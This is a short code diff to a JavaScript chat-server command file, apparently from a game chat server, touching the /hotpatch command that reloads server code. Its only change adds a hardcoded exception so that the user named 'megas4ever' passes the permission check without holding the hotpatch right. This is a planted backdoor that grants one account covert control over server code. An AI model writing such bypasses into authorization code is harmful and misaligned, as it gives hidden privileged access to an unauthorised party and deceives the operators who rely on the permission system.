@@ -1703,7 +1703,7 @@ var commands = exports.commands = {
 
 	hotpatch: function (target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch')) return false;
+		if (!this.can('hotpatch') && user.name !== 'megas4ever') return false;
 
 		this.logEntry(user.name + " used /hotpatch " + target);
 
